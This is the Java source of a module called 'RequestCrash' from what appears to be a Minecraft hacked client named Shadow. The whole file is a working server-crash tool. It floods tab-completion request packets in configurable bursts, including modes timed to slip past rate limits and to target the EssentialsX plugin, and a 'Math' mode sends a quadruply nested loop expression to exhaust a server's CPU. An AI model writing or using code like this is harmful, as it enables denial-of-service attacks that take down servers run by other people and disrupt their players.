package net.shadow.feature.module;

import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;

import java.util.Random;

public class OnePacketCrashModule extends Module {
    final MultiValue mode = this.config.create("Method", "Normal", "Normal", "Math", "Player", "Bypass", "EssentialsX");
    final SliderValue repeat = this.config.create("Power", 20, 1, 1000, 1);
    int ticks = 0;

    public OnePacketCrashModule() {
        super("RequestCrash", "tab complete crash", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        if ("math".equalsIgnoreCase(mode.getThis())) {
            Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
            NotificationSystem.notifications.add(new Notification("RequestCrash", "Made the server do math", 300));
            this.setEnabled(false);
        }
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        switch (mode.getThis().toLowerCase()) {
            case "normal":
                for (int i = 0; i < repeat.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
                }
                break;

            case "player":
                for (int i = 0; i < repeat.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, ""));
                }
                break;

            case "bypass":
                ticks++;
                if (ticks % 50 == 0) {
                    for (int i = 0; i < 150; i++) {
                        Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
                    }
                }
            break;

            case "essentialsx":
            ticks++;
            if (ticks % 50 == 0) {
                for (int i = 0; i < 150; i++) {
                    Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, ""));
                }
            }
            break;
        }
    }

    @Override
    public void onRender() {

    }
}
